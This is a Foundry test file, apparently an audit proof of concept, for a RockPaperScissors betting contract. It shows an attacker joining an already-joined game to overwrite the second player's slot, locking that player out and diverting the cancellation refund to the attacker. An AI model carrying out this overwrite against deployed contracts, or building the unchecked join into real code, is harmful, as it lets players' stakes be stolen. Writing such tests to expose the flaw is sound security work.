// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/RockPaperScissors.sol";

contract JoinOverwriteTest is Test {
    RockPaperScissors internal game;

    address internal creator = address(0xA11CE);
    address internal playerB = address(0xB0B);
    address internal playerC = address(0xC0DE);

    uint256 internal constant BET = 0.1 ether;
    uint256 internal constant TIMEOUT = 10 minutes;
    uint256 internal constant TURNS = 3;

    function setUp() public {
        game = new RockPaperScissors();

        vm.deal(creator, 10 ether);
        vm.deal(playerB, 10 ether);
        vm.deal(playerC, 10 ether);
    }

    function testJoinOverwrite() public {
        vm.prank(creator);
        uint256 gameId = game.createGameWithEth{value: BET}(TURNS, TIMEOUT);

        uint256 playerBBalanceBefore = playerB.balance;

        vm.prank(playerB);
        game.joinGameWithEth{value: BET}(gameId);

        // Attacker overwrites playerB slot
        vm.prank(playerC);
        game.joinGameWithEth{value: BET}(gameId);

        ( , address storedPlayerB,,,,,,,,,,,,,, ) = game.games(gameId);
        assertEq(storedPlayerB, playerC, "playerB slot should be overwritten");

        // Original player can no longer continue the game
        vm.prank(playerB);
        vm.expectRevert("Not a player in this game");
        game.commitMove(gameId, bytes32("fake commit"));

        // Creator cancels the game: refund goes to attacker, not original player
        vm.prank(creator);
        game.cancelGame(gameId);

        assertEq(playerB.balance, playerBBalanceBefore - BET, "original joiner never refunded");
    }
}
